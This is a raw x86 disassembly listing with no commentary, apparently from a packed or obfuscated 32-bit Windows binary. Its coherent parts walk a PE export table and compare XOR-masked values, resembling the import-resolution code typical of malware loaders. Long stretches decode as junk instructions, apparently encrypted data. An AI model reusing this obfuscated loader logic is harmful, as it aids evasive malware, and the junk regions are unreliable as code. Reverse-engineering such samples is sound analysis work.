  40738c:	cmp    DWORD PTR ds:0x42c89e,0xb
  407393:	jne    0x4073a5
  407399:	push   DWORD PTR [ebp-0x24]
  40739c:	push   DWORD PTR [ebp-0x14]
  40739f:	call   DWORD PTR ds:0x4279f7
  4073a5:	cmp    DWORD PTR ds:0x42c89e,0xa
  4073ac:	jne    0x4073bf
  4073b2:	mov    edi,DWORD PTR ds:0x42c89e
  4073b8:	inc    edi
  4073b9:	mov    DWORD PTR ds:0x42c89e,edi
  4073bf:	cmp    DWORD PTR ds:0x42c89e,0x1a
  4073c6:	jb     0x40737f
  4073cc:	xor    DWORD PTR ds:0x427d17,edx
  4073d2:	mov    edi,0x1556
  4073d7:	xchg   esi,ecx
  4073d9:	sub    edx,edi
  4073db:	sbb    ecx,DWORD PTR ds:0x4292d1
  4073e1:	xor    esi,esi
  4073e3:	mov    DWORD PTR [ebp-0x28],esi
  4073e6:	or     ecx,DWORD PTR ds:0x427d1f
  4073ec:	mov    DWORD PTR [ebp-0x2c],esi
  4073ef:	mov    ecx,DWORD PTR ds:0x42c886
  4073f5:	xor    DWORD PTR ds:0x42759c,ecx
  4073fb:	mov    DWORD PTR [ebp-0x14],esi
  4073fe:	and    DWORD PTR ds:0x4292c1,0x0
  407408:	jmp    0x40741c
  40740d:	xor    ecx,ecx
  40740f:	or     ecx,DWORD PTR ds:0x4292c1
  407415:	inc    ecx
  407416:	mov    DWORD PTR ds:0x4292c1,ecx
  40741c:	cmp    DWORD PTR ds:0x4292c1,0x12
  407423:	jae    0x4075d0
  407429:	cmp    DWORD PTR ds:0x4292c1,0x1e
  407430:	jne    0x40743c
  407436:	call   DWORD PTR ds:0x427ad3
  40743c:	jmp    0x40740d
  407441:	sub    ecx,0x7ae1
  407447:	jmp    0x4075d0
  40744c:	add    DWORD PTR [eax-0xd],edx
  40744f:	sbb    esp,DWORD PTR [ebp-0x5]
  407452:	cdq    
  407453:	push   0xffffffc7
  407455:	stos   BYTE PTR es:[edi],al
  407456:	cmp    eax,eax
  407458:	adc    bl,BYTE PTR [edx+0x20836751]
  40745e:	jl     0x4074dc
  407460:	call   0xefbcf0e4
  407465:	or     edx,DWORD PTR [ecx]
  407467:	mov    dh,0xe1
  407469:	push   edx
  40746a:	jg     0x4074d6
  40746c:	inc    edi
  40746d:	lea    esi,[ebx-0x35abedff]
  407473:	lods   al,BYTE PTR ds:[esi]
  407474:	jecxz  0x40741a
  407476:	rol    BYTE PTR [edx+0x7605b539],0x93
  40747d:	mov    al,ds:0x934d2c28
  407482:	mov    edi,esp
  407484:	mov    dl,0x51
  407486:	je     0x407473
  407488:	jmp    0xe7cb:0x30442ec3
  40748f:	dec    eax
  407490:	repz pop ebp
  407492:	retf   
  407493:	xchg   ebx,eax
  407494:	inc    esp
  407495:	sub    BYTE PTR [ebp+0x1cc6e7b0],ch
  40749b:	sub    al,0xe8
  40749d:	and    al,0xff
  40749f:	bound  edx,QWORD PTR [ecx+eiz*2-0x3ed86d86]
  4074a6:	ror    ch,1
  4074a8:	cmc    
  4074a9:	aam    0xaf
  4074ab:	push   edi
  4074ac:	fwait
  4074ad:	cli    
  4074ae:	call   DWORD PTR ss:[esi-0xd9356c8]
  4074b5:	xor    dh,BYTE PTR [edx-0x2f]
  4074b8:	sub    DWORD PTR [esi+0x2845054d],ebp
  4074be:	push   0x52
  4074c0:	in     al,dx
  4074c1:	pop    ecx
  4074c2:	inc    edx
  4074c3:	and    ah,BYTE PTR [ebx+0x52]
  4074c6:	enter  0x9f10,0x2e
  4074ca:	or     bh,ch
  4074cc:	das    
  4074cd:	mov    edi,es
  4074cf:	jle    0x407545
  4074d1:	daa    
  4074d2:	or     edi,DWORD PTR [eax*2+0x60cc850c]
  4074d9:	stc    
  4074da:	scas   eax,DWORD PTR es:[edi]
  4074db:	push   esi
  4074dc:	mov    ds:0x66051bac,al
  4074e2:	push   cs
  4074e3:	mov    ebx,0x74de4233
  4074e8:	inc    eax
  4074e9:	push   esp
  4074ea:	(bad)  
  4074eb:	fstp   TBYTE PTR [ebx-0x1aeae817]
  4074f1:	pop    ss
  4074f2:	add    cl,ah
  4074f4:	add    DWORD PTR [ebx-0x38],edi
  4074f7:	aad    0x10
  4074f9:	mov    edx,DWORD PTR [esp+edi*4]
  4074fc:	push   edx
  4074fd:	das    
  4074fe:	retf   
  4074ff:	mov    eax,ds:0x8f9df603
  407504:	and    eax,0x19b93032
  407509:	out    0x2,eax
  40750b:	loope  0x40751a
  40750d:	pop    esp
  40750e:	mov    dl,0x95
  407510:	xor    bh,dh
  407512:	repnz outs dx,DWORD PTR ds:[esi]
  407514:	mov    fs,WORD PTR [ebx+0x65862281]
  40751a:	popf   
  40751b:	fdivr  QWORD PTR [esi+0x33f2d3c]
  407521:	jmp    0x3f77:0xd476ee28
  407528:	pop    ss
  407529:	or     al,0xeb
  40752b:	arpl   WORD PTR [ebx-0x48933380],si
  407531:	and    dh,BYTE PTR [ebp+0x430f227]
  407537:	xchg   esi,eax
  407538:	ret    0x4e23
  40753b:	mov    ebp,0x14b491fa
  407540:	cmp    ch,BYTE PTR [edx]
  407542:	pushf  
  407543:	sub    al,BYTE PTR [eax]
  407545:	sbb    DWORD PTR [edx*2-0x18955449],edi
  40754c:	jp     0x4075c0
  40754e:	mov    ebx,DWORD PTR [edi+esi*1-0x71]
  407552:	repz xor BYTE PTR [ebx],bh
  407555:	sub    DWORD PTR [ecx+0x5b],ecx
  407558:	std    
  407559:	test   eax,0xbd0e773f
  40755e:	and    eax,0x87842ba9
  407563:	pop    es
  407564:	ins    BYTE PTR es:[edi],dx
  407565:	cdq    
  407566:	xor    eax,0xdad2aeac
  40756b:	imul   esp,DWORD PTR ds:0xe7538b48,0x952eb64d
  407575:	xor    al,0xbf
  407577:	and    eax,0xddd7d647
  40757c:	cdq    
  40757d:	sub    ebx,DWORD PTR [esi+eax*1-0x4b]
  407581:	pop    edi
  407582:	add    ah,cl
  407584:	sbb    BYTE PTR [esi+0x55],bh
  407587:	lahf   
  407588:	test   eax,0x2df7bf90
  40758d:	fdiv   DWORD PTR [ecx+ebp*8+0x6b21a7ad]
  407594:	pusha  
  407595:	fisttp WORD PTR [eax]
  407597:	call   0xdcc9f199
  40759c:	out    0x4b,al
  40759e:	(bad)  
  40759f:	imul   ecx,eax,0x7206ff44
  4075a5:	das    
  4075a6:	fnstsw WORD PTR [ebx]
  4075a8:	add    DWORD PTR [edi+0x54052138],esp
  4075ae:	mov    ebp,DWORD PTR ds:0x349d60f3
  4075b4:	fisttp QWORD PTR [edx-0x70]
  4075b7:	inc    esi
  4075b8:	jp     0x4075f7
  4075ba:	xor    al,bh
  4075bc:	fst    st(5)
  4075be:	push   eax
  4075bf:	or     dl,ch
  4075c1:	pop    eax
  4075c2:	mov    BYTE PTR [eax],cl
  4075c4:	mov    edx,0x1937b0b6
  4075c9:	adc    eax,0x97c8bbf7
  4075ce:	imul   esp,eax,0x8bf87589
  4075d4:	dec    ebp
  4075d5:	call   0xb6503e0d
  4075da:	add    eax,0x4292bd
  4075df:	add    eax,DWORD PTR ds:0x4275b0
  4075e5:	mov    ds:0x4292bd,eax
  4075ea:	xor    edi,edi
  4075ec:	and    eax,DWORD PTR ds:0x427594
  4075f2:	jmp    0x40777b
  4075f7:	dec    cl
  4075f9:	pushf  
  4075fa:	adc    dl,BYTE PTR [edi+0x6d]
  4075fd:	repnz ins DWORD PTR es:[edi],dx
  4075ff:	xchg   esi,eax
  407600:	dec    eax
  407601:	fstp   DWORD PTR [ebp+0x4f]
  407604:	ficomp WORD PTR [ebp-0x20]
  407607:	jg     0x40762b
  407609:	jl     0x407687
  40760b:	call   0x48bcf28f
  407610:	mov    dl,0xcb
  407612:	not    DWORD PTR [ecx-0x21]
  407615:	push   edi
  407616:	and    eax,0x44d918c9
  40761b:	jbe    0x4075f4
  40761d:	aaa    
  40761e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40761f:	setae  BYTE PTR [ecx+0x58]
  407623:	xchg   DWORD PTR [edx-0x7bfb4c26],esp
  407629:	enter  0x6c09,0xa1
  40762d:	adc    eax,0x539948f3
  407632:	jo     0x407662
  407634:	adc    eax,0x2e39b622
  407639:	or     bl,cl
  40763b:	clc    
  40763c:	and    ebp,esp
  40763e:	sbb    DWORD PTR gs:[edx],esi
  407641:	lods   eax,DWORD PTR ds:[esi]
  407642:	push   edi
  407643:	mov    esi,0xfc1cbf72
  407648:	dec    ecx
  407649:	loopne 0x40763a
  40764b:	enter  0x7a0b,0x42
  40764f:	push   0x23
  407651:	or     DWORD PTR [esi-0x2082a73d],esi
  407657:	xchg   edx,eax
  407658:	loop   0x40762c
  40765a:	imul   edi,esp,0x25
  40765d:	xor    DWORD PTR [ecx+0x4a29866f],ecx
  407663:	cwde   
  407664:	jnp    0x4076d8
  407666:	mov    eax,ds:0x488c839b
  40766b:	sahf   
  40766c:	add    al,0xd7
  40766e:	mov    esi,0x2f651d63
  407673:	xor    DWORD PTR cs:[eax+0x4df2a438],eax
  40767a:	mov    al,BYTE PTR [ecx]
  40767c:	pusha  
  40767d:	sbb    dh,cl
  40767f:	jecxz  0x4076ef
  407681:	cmp    ch,BYTE PTR [ecx]
  407683:	pushf  
  407684:	push   ss
  407685:	iret   
  407686:	dec    edx
  407687:	fwait
  407688:	and    DWORD PTR [ecx],ebp
  40768a:	imul   ecx,DWORD PTR [edi-0xab5f6d1],0xffffffc7
  407691:	mov    ds:0x20d05255,eax
  407696:	sti    
  407697:	jg     0x4076dc
  407699:	cmp    eax,0xde40251
  40769e:	icebp  
  40769f:	cs mov eax,0xfb57d78e
  4076a5:	and    eax,0xcaac8c47
  4076aa:	ror    DWORD PTR [eax-0x29365087],1
  4076b0:	jle    0x407671
  4076b2:	adc    DWORD PTR [ebx-0x34],edi
  4076b5:	loop   0x40764d
  4076b7:	and    eax,0x3f3e0ede
  4076bc:	call   0x66cb:0xf9e870d1
  4076c3:	mov    esp,0x5b61ea7a
  4076c8:	int3   
  4076c9:	or     bh,ah
  4076cb:	enter  0xc9b8,0x75
  4076cf:	mov    edi,0xb08b3f2e
  4076d4:	sbb    eax,DWORD PTR [ecx-0x65]
  4076d7:	push   0xced7daab
  4076dc:	mov    dl,0x16
  4076de:	xor    al,0x29
  4076e0:	scas   al,BYTE PTR es:[edi]
  4076e1:	push   ebp
  4076e2:	dec    esp
  4076e3:	bound  eax,QWORD PTR ds:0x1b752584
  4076e9:	jns    0x407726
  4076eb:	fs cmc 
  4076ed:	pop    eax
  4076ee:	test   bl,dl
  4076f0:	lds    edi,FWORD PTR [edx]
  4076f2:	xchg   esi,eax
  4076f3:	push   0x30
  4076f5:	mov    bh,ah
  4076f7:	jno    0x407777
  4076f9:	adc    ah,BYTE PTR [ebx]
  4076fb:	xchg   ebx,eax
  4076fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076fd:	mov    cl,0xff
  4076ff:	scas   eax,DWORD PTR es:[edi]
  407700:	pop    esi
  407701:	adc    DWORD PTR [edx],esp
  407703:	or     ebp,DWORD PTR [eax-0x73c1676d]
  407709:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40770a:	mov    cl,0x20
  40770c:	test   al,0x50
  40770e:	cmp    eax,0x2597a35
  407713:	xchg   esp,ebx
  407715:	retf   0xe747
  407718:	sub    ah,BYTE PTR [edi+0x37]
  40771b:	adc    al,0x65
  40771d:	out    0x5f,eax
  40771f:	in     eax,dx
  407720:	ds test al,al
  407723:	test   eax,0x8852195c
  407728:	(bad)  
  407729:	pop    edi
  40772a:	xor    DWORD PTR [ecx-0x37],edx
  40772d:	push   esp
  40772e:	ja     0x407707
  407730:	and    ch,BYTE PTR [edx-0x77]
  407733:	rcl    BYTE PTR [ecx-0x1e9c896a],1
  407739:	pop    ebp
  40773a:	in     al,0xec
  40773c:	cmp    dl,BYTE PTR [esi+0x5e]
  40773f:	sub    esp,0x678e5762
  407745:	pop    ebp
  407747:	daa    
  407748:	dec    edx
  407749:	xor    bh,BYTE PTR [ecx+0x6e]
  40774c:	scas   al,BYTE PTR es:[edi]
  40774d:	push   ss
  40774e:	xchg   BYTE PTR [ecx+0x38],al
  407751:	test   BYTE PTR [edi+0x7a666faf],bh
  407757:	sbb    ah,BYTE PTR [edi]
  407759:	repz push ds
  40775b:	xor    al,0xfa
  40775d:	jp     0x40774f
  40775f:	or     bh,bl
  407761:	dec    ecx
  407762:	push   esp
  407763:	scas   al,BYTE PTR es:[edi]
  407764:	sar    BYTE PTR [esi-0x265f04b5],1
  40776a:	inc    ecx
  40776b:	fidiv  WORD PTR [edi+edi*1]
  40776e:	mov    dl,0x33
  407770:	ins    DWORD PTR es:[edi],dx
  407771:	(bad)  
  407772:	imul   ebx,DWORD PTR [edi-0x66b1423b],0x3dd4e77
  40777c:	retf   
  40777d:	mov    DWORD PTR [ebp-0x20],ecx
  407780:	mov    eax,DWORD PTR [ebp-0x20]
  407783:	je     0x407a73
  407789:	and    DWORD PTR ds:0x42c882,0x0
  407793:	xor    eax,eax
  407795:	xor    eax,DWORD PTR ds:0x42c882
  40779b:	inc    eax
  40779c:	mov    ds:0x42c882,eax
  4077a1:	cmp    DWORD PTR ds:0x42c882,0x16
  4077a8:	jne    0x4077b9
  4077ae:	push   0x42785c
  4077b3:	call   DWORD PTR ds:0x427c77
  4077b9:	cmp    DWORD PTR ds:0x42c882,0x11
  4077c0:	jb     0x407793
  4077c6:	mov    eax,ds:0x42c88e
  4077cb:	xor    DWORD PTR ds:0x4292dd,eax
  4077d1:	mov    eax,DWORD PTR [ebp-0x4]
  4077d4:	xor    eax,0x7510857
  4077d9:	xor    DWORD PTR ds:0x4292c9,0x4292c1
  4077e3:	add    eax,ebx
  4077e5:	cmp    edi,eax
  4077e7:	jne    0x40788d
  4077ed:	sub    DWORD PTR ds:0x42759c,0x4275a4
  4077f7:	push   DWORD PTR [ebp+0x8]
  4077fa:	call   0x4063f7
  4077ff:	mov    DWORD PTR [ebp-0x20],eax
  407802:	xor    eax,eax
  407804:	add    eax,DWORD PTR ds:0x4292f5
  40780a:	xor    esi,esi
  40780c:	xor    esi,DWORD PTR ds:0x4278af
  407812:	sub    esi,eax
  407814:	sub    eax,DWORD PTR [eax+esi*1]
  407817:	mov    eax,DWORD PTR [ebp-0x4]
  40781a:	sub    esi,DWORD PTR ds:0x42c896
  407820:	mov    ecx,DWORD PTR [ebp-0x20]
  407823:	mov    esi,0x7510857
  407828:	xor    eax,esi
  40782a:	adc    DWORD PTR ds:0x4292b9,0x7173
  407834:	add    eax,ebx
  407836:	cmp    ecx,eax
  407838:	je     0x407a57
  40783e:	push   DWORD PTR [ebp-0x20]
  407841:	push   DWORD PTR [ebp+0x8]
  407844:	call   0x4064f3
  407849:	mov    DWORD PTR [ebp-0x14],eax
  40784c:	mov    eax,DWORD PTR [ebp-0x4]
  40784f:	mov    ecx,DWORD PTR [ebp-0x14]
  407852:	xor    eax,esi
  407854:	add    eax,ebx
  407856:	cmp    ecx,eax
  407858:	je     0x407a57
  40785e:	mov    eax,DWORD PTR [ebp-0x14]
  407861:	mov    eax,DWORD PTR [eax+0x18]
  407864:	mov    DWORD PTR [ebp-0x20],eax
  407867:	mov    eax,DWORD PTR [ebp-0x14]
  40786a:	mov    ecx,DWORD PTR [ebp+0x8]
  40786d:	add    ecx,DWORD PTR [eax+0x20]
  407870:	mov    DWORD PTR [ebp-0x28],ecx
  407873:	mov    eax,DWORD PTR [ebp-0x14]
  407876:	mov    ecx,DWORD PTR [ebp+0x8]
  407879:	add    ecx,DWORD PTR [eax+0x24]
  40787c:	mov    DWORD PTR [ebp-0x2c],ecx
  40787f:	mov    eax,DWORD PTR [ebp-0x14]
  407882:	mov    ecx,DWORD PTR [ebp+0x8]
  407885:	add    ecx,DWORD PTR [eax+0x1c]
  407888:	xor    esi,esi
  40788a:	mov    DWORD PTR [ebp-0x14],ecx
  40788d:	mov    eax,DWORD PTR [ebp-0x28]
  407890:	mov    ecx,DWORD PTR [ebp+0x8]
  407893:	add    ecx,DWORD PTR [eax+edi*4]
  407896:	lea    eax,[ebp-0x8]
  407899:	mov    DWORD PTR [ebp-0x30],ecx
  40789c:	push   eax
  40789d:	push   DWORD PTR [ebp-0x30]
  4078a0:	push   DWORD PTR [ebp+0xc]
  4078a3:	call   0x403932
  4078a8:	mov    eax,DWORD PTR [ebp-0x4]
  4078ab:	mov    ecx,DWORD PTR [ebp-0x8]
  4078ae:	xor    eax,0x7510857
  4078b3:	add    eax,ebx
  4078b5:	jmp    0x407a3e
  4078ba:	retf   
  4078bb:	idiv   BYTE PTR [edi+0x6de9b5d6]
  4078c1:	lods   eax,DWORD PTR ds:[esi]
  4078c2:	out    0xb6,al
  4078c4:	scas   eax,DWORD PTR es:[edi]
  4078c5:	xchg   DWORD PTR [edx+eax*2+0x54],esp
  4078c9:	xchg   ebx,ebp
  4078cb:	and    eax,0x7fe87c7c
  4078d0:	jl     0x40794e
  4078d2:	push   ecx
  4078d3:	and    esi,ecx
  4078d5:	pop    ss
  4078d6:	jnp    0x407950
  4078d8:	gs iret 
  4078da:	imul   esi,DWORD PTR [edx+0x12],0xfffffff0
  4078de:	into   
  4078df:	or     dl,BYTE PTR [esi+0x5897f834]
  4078e5:	xchg   ebx,eax
  4078e6:	pop    esp
  4078e7:	ins    DWORD PTR es:[edi],dx
  4078e8:	mov    eax,0xa0d5e455
  4078ed:	mov    ecx,esi
  4078ef:	jge    0x4078b6
  4078f1:	mov    ah,0x11
  4078f3:	mov    ah,0xba
  4078f5:	xchg   ecx,eax
  4078f6:	adc    eax,0xee8ef904
  4078fb:	out    0xe3,eax
  4078fd:	jmp    0xf51ba8fb
  407902:	add    ch,dl
  407904:	or     DWORD PTR [edx-0x303a0f14],0x1dcbc5e3
  40790e:	js     0x4078cf
  407910:	je     0x407964
  407912:	xor    BYTE PTR [ecx+0x62ac49ff],ah
  407918:	add    esi,DWORD PTR [edx-0x6f070a33]
  40791e:	add    al,0xc9
  407920:	pop    ebx
  407921:	inc    ebx
  407922:	aad    0x47
  407924:	popf   
  407925:	xchg   ebx,eax
  407926:	popa   
  407927:	sbb    ch,BYTE PTR [edx+0x7c]
  40792a:	addr16 fwait
  40792c:	jl     0x4078f5
  40792e:	das    
  40792f:	pop    ebx
  407930:	fnstsw WORD PTR [esi+0xc]
  407933:	cmp    BYTE PTR [ecx-0x10],ch
  407936:	out    dx,al
  407937:	cwde   
  407938:	and    BYTE PTR [esi+0x19],bh
  40793b:	or     eax,0x1e567dd3
  407940:	sbb    cl,BYTE PTR [ebx]
  407942:	stc    
  407943:	mov    edx,0xdfbdabff
  407948:	ret    
  407949:	adc    ebx,DWORD PTR [esp+ebp*1+0x5b3e54e]
  407950:	inc    esi
  407951:	std    
  407952:	sbb    esp,DWORD PTR [esi+edx*4]
  407955:	mov    ebp,0xb368c1e2
  40795a:	cmp    eax,0xf0ce5fe6
  40795f:	leave  
  407960:	push   eax
  407961:	mov    ecx,0xd7d92e16
  407966:	(bad)  
  407967:	data16 daa 
  407969:	retf   0xf3b8
  40796c:	test   DWORD PTR [ebx-0x12],ecx
  40796f:	ds mov dh,0x93
  407972:	jo     0x407994
  407974:	mov    esp,ss
  407976:	jmp    0xcd38331c
  40797b:	push   ebx
  40797c:	jg     0x40799d
  40797e:	push   ss
  40797f:	loopne 0x4079db
  407981:	ret    
  407982:	sbb    al,BYTE PTR ds:0x656ca215
  407988:	push   esi
  407989:	sbb    al,0x80
  40798b:	sub    ah,BYTE PTR [ebx]
  40798d:	and    bh,dh
  40798f:	pop    edx
  407990:	retf   
  407991:	sub    ebx,DWORD PTR [ecx+eax*8+0x59f6448c]
  407998:	in     eax,dx
  407999:	fbstp  TBYTE PTR [ebx]
  40799b:	pop    edx
  40799c:	or     BYTE PTR [eax-0x59ac1e6],bh
  4079a2:	mov    bh,0x26
  4079a4:	jnp    0x4079d0
  4079a6:	mov    al,0x6c
  4079a8:	and    ebx,ebp
  4079aa:	inc    edx
  4079ab:	mov    ah,0x9c
  4079ad:	mul    DWORD PTR [ecx+0x6735b082]
  4079b3:	aad    0x5b
  4079b5:	push   ss
  4079b6:	cmc    
  4079b7:	pop    esi
  4079b8:	mov    edi,ebx
  4079ba:	sar    DWORD PTR [ebx-0x7035f30],cl
  4079c0:	push   ss
  4079c1:	jns    0x407997
  4079c3:	outs   dx,BYTE PTR ds:[esi]
  4079c4:	pop    esi
  4079c5:	xchg   DWORD PTR [ecx-0x74cba09e],ebp
  4079cb:	sti    
  4079cc:	scas   eax,DWORD PTR es:[edi]
  4079cd:	pop    edx
  4079ce:	push   ebp
  4079cf:	shl    BYTE PTR [ebx-0x4fa68d40],1
  4079d5:	ins    BYTE PTR es:[edi],dx
  4079d6:	pop    ss
  4079d7:	cmp    DWORD PTR [ebx],edx
  4079d9:	loop   0x407a1a
  4079db:	lds    ebx,FWORD PTR [eax-0x67175cb8]
  4079e1:	out    0x61,eax
  4079e3:	pop    ss
  4079e4:	mov    al,ds:0xcdb06bf1
  4079e9:	dec    ebp
  4079ea:	ret    0xb849
  4079ed:	sbb    BYTE PTR [eax-0x39705ce9],al
  4079f3:	mov    al,ds:0x1203169d
  4079f8:	and    al,0xc6
  4079fa:	sub    ah,BYTE PTR [edx+ecx*1+0x5a243192]
  407a01:	aaa    
  407a02:	mov    esp,0x9f9ffdf8
  407a07:	add    BYTE PTR [edi],dh
  407a09:	or     BYTE PTR [edx+ebp*1],ch
  407a0c:	iret   
  407a0d:	lods   eax,DWORD PTR ds:[esi]
  407a0e:	mov    dl,BYTE PTR [ecx]
  407a10:	sbb    al,0x12
  407a13:	mov    dh,0xd7
  407a15:	pop    esp
  407a16:	mov    edx,0xcae50c70
  407a1b:	xchg   DWORD PTR [eax],edi
  407a1d:	(bad)  
  407a1e:	sub    BYTE PTR [esp+edi*2+0x7c],ah
  407a22:	jg     0x407a1f
  407a24:	ds clc 
  407a26:	push   esi
  407a27:	ins    BYTE PTR es:[edi],dx
  407a28:	push   ebp
  407a29:	js     0x4079b5
  407a2b:	shl    cl,cl
  407a2d:	shl    BYTE PTR [ebp-0x55d38d42],cl
  407a33:	sbb    ah,BYTE PTR [edi+0x7a]
  407a36:	imul   esp,DWORD PTR [ebp-0x2b],0x2f008329
  407a3d:	(bad)  
  407a3f:	enter  0x850f,0x1d
  407a43:	add    BYTE PTR [eax],al
  407a45:	add    BYTE PTR [ebx+0x3b47e045],cl
  407a4b:	clc    
  407a4c:	jb     0x407789
  407a52:	jmp    0x407a73
  407a57:	mov    eax,DWORD PTR [ebp-0x4]
  407a5a:	xor    eax,esi
  407a5c:	add    eax,ebx
  407a5e:	jmp    0x408b1b
  407a63:	mov    eax,DWORD PTR [ebp-0x2c]
  407a66:	movzx  eax,WORD PTR [eax+edi*2]
  407a6a:	mov    ecx,DWORD PTR [ebp-0x14]
  407a6d:	mov    eax,DWORD PTR [ecx+eax*4]
  407a70:	mov    DWORD PTR [ebp+0xc],eax
  407a73:	mov    eax,DWORD PTR [ebp-0x4]
  407a76:	mov    ecx,DWORD PTR [ebp-0x8]
  407a79:	xor    eax,0x7510857
  407a7e:	add    eax,ebx
  407a80:	cmp    ecx,eax
  407a82:	jne    0x407a95
  407a88:	mov    eax,DWORD PTR [ebp-0x4]
  407a8b:	xor    eax,0x7510857
  407a90:	jmp    0x407a5c
  407a95:	mov    eax,DWORD PTR [ebp+0xc]
  407a98:	add    eax,DWORD PTR [ebp+0x8]
  407a9b:	mov    DWORD PTR [ebp-0x10],eax
  407a9e:	mov    eax,DWORD PTR [ebp-0x1c]
  407aa1:	test   eax,eax
  407aa3:	je     0x4087bb
  407aa9:	mov    DWORD PTR [ebp-0x24],esi
  407aac:	push   0xb
  407aae:	pop    ecx
  407aaf:	push   0x5
  407ab1:	dec    ecx
  407ab2:	pop    ebx
  407ab3:	xchg   ebx,ecx
  407ab5:	sub    ebx,ecx
  407ab7:	xchg   ebx,ecx
  407ab9:	dec    ecx
  407aba:	jmp    0x407c43
  407abf:	adc    edi,DWORD PTR [eax+0x2d9d7285]
  407ac5:	mov    ds:0xbdc820bd,eax
  407aca:	inc    edx
  407acb:	mov    cl,0xab
  407acd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ace:	out    dx,eax
  407acf:	inc    edi
  407ad0:	and    al,0x7c
  407ad2:	jl     0x407abc
  407ad4:	jg     0x407b52
  407ad6:	jl     0x407b1b
  407ad8:	jle    0x407abc
  407ada:	lock pmulhw mm7,QWORD PTR [edi]
  407ade:	mov    ss,esp
  407ae0:	push   ecx
  407ae1:	(bad)  
  407ae2:	mov    eax,ds:0xc836513f
  407ae7:	loopne 0x407af4
  407ae9:	stos   BYTE PTR es:[edi],al
  407aea:	fidiv  DWORD PTR [edx]
  407aec:	cmp    bh,BYTE PTR [ecx]
  407aee:	shl    BYTE PTR [edi+0x3c56259c],0x51
  407af5:	jge    0x407b3e
  407af7:	dec    ecx
  407af8:	gs mov eax,0x7d80edfc
  407afe:	and    eax,0x7e91739a
  407b03:	daa    
  407b04:	inc    esp
  407b05:	stos   BYTE PTR es:[edi],al
  407b06:	dec    BYTE PTR [edi]
  407b08:	add    al,0x2e
  407b0a:	arpl   WORD PTR [edi+ecx*2],sp
  407b0d:	jge    0x407b36
  407b0f:	(bad)  
  407b10:	les    esi,FWORD PTR [edi-0x5e55d615]
  407b16:	mov    ds:0xf1165ab1,al
  407b1b:	jnp    0x407aae
  407b1d:	int    0x44
  407b1f:	inc    esi
  407b20:	ja     0x407b05
  407b22:	cmp    BYTE PTR [edi],bh
  407b24:	and    edx,DWORD PTR [edx+eiz*1+0x62cc6a31]
  407b2b:	mov    eax,0x25580b4b
  407b30:	bnd jo 0x407ac5
  407b33:	mov    dl,0x1c
  407b35:	and    eax,0x25be3838
  407b3a:	xchg   ebp,eax
  407b3b:	ret    
  407b3c:	test   eax,0x8f77ca71
  407b41:	dec    esp
  407b42:	ret    0xa0b5
  407b45:	xchg   esi,eax
  407b46:	fs push eax
  407b48:	cmp    bh,ch
  407b4a:	aaa    
  407b4b:	aaa    
  407b4c:	lock push ss
  407b4e:	fcomp  st(4)
  407b50:	mov    dl,0x27
  407b52:	int    0xe1
  407b54:	ret    0xfae1
  407b57:	shl    esp,0x13
  407b5a:	mov    ebx,0xfb6b5f19
  407b5f:	push   edi
  407b60:	out    dx,al
  407b61:	ficomp DWORD PTR [edx+ecx*4]
  407b64:	xor    DWORD PTR [edi*8+0x167b6b8f],ecx
  407b6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b6c:	call   0x8b29:0xc609b520
  407b73:	call   0xcc9b:0xdf00452f
  407b7a:	mov    cl,0x46
  407b7c:	pop    ss
  407b7d:	mov    ah,0xb5
  407b7f:	or     BYTE PTR [ecx+ebp*1-0x2f],cl
  407b83:	cmc    
  407b84:	out    dx,eax
  407b85:	mov    ch,BYTE PTR [ebx]
  407b87:	rcl    DWORD PTR [ebp+0x32],0x5f
  407b8b:	aas    
  407b8c:	in     eax,dx
  407b8d:	add    BYTE PTR [eax],0x21
  407b90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b91:	sbb    eax,0x28f8034e
  407b96:	add    DWORD PTR [esi],esi
  407b98:	stc    
  407b99:	jns    0x407bae
  407b9b:	inc    edx
  407b9c:	adc    BYTE PTR [esi],bh
  407b9e:	mov    eax,ds:0x918f0623
  407ba3:	bound  eax,QWORD PTR [ebx-0x6d]
  407ba6:	and    eax,DWORD PTR [ebx]
  407ba8:	aas    
  407ba9:	adc    BYTE PTR [esi-0x77],al
  407bac:	mov    dl,0xf9
  407bae:	sbb    BYTE PTR [eax+0x18],0x4
  407bb2:	or     bh,BYTE PTR [edi+0x540281d4]
  407bb8:	xchg   BYTE PTR [ebp-0x42],ah
  407bbb:	xchg   ebp,eax
  407bbc:	sub    cl,dh
  407bbe:	lods   eax,DWORD PTR ds:[esi]
  407bbf:	jp     0x407c30
  407bc1:	mov    cl,0x95
  407bc3:	sub    BYTE PTR [edx+0x59],0xf6
  407bc7:	lods   al,BYTE PTR ds:[esi]
  407bc8:	fbstp  TBYTE PTR [esi+ecx*8+0x4c]
  407bcc:	adc    DWORD PTR [edi-0x3e2823ff],ebx
  407bd2:	push   ebx
  407bd3:	xchg   BYTE PTR [esp+ebx*8],dl
  407bd6:	cdq    
  407bd7:	lods   al,BYTE PTR ds:[esi]
  407bd8:	adc    BYTE PTR [esi-0x66],bl
  407bdb:	lahf   
  407bdc:	adc    ebx,edx
  407bde:	clc    
  407bdf:	pop    ebp
  407be0:	sub    eax,0xdef9f2e
  407be5:	mov    eax,ds:0xd44df1b4
  407bea:	jmp    0x407c5e
  407bec:	into   
  407bed:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bef:	pop    esi
  407bf0:	in     al,dx
  407bf1:	call   0x75a2:0xecd6f06c
  407bf8:	mov    eax,ds:0x9ee20689
  407bfd:	mov    bh,0x6d
  407bff:	sub    eax,0x1ddabb8b
  407c04:	mov    BYTE PTR [edi],bh
  407c06:	fldenv gs:[esi]
  407c09:	add    eax,ecx
  407c0b:	dec    eax
  407c0c:	push   es
  407c0d:	out    dx,eax
  407c0e:	das    
  407c0f:	test   eax,0x371c4d5
  407c14:	enter  0x3f31,0xab
  407c18:	lods   al,BYTE PTR ds:[esi]
  407c19:	jecxz  0x407bb6
  407c1b:	mov    cl,ch
  407c1d:	inc    edx
  407c1e:	xor    bl,BYTE PTR [edi+0x66085d15]
  407c24:	das    
  407c25:	sub    edi,DWORD PTR [esi-0x3be0b58c]
  407c2b:	pop    esp
  407c2c:	mov    ah,0x4a
  407c2e:	adc    edx,DWORD PTR [ebx]
  407c30:	adc    al,0x6b
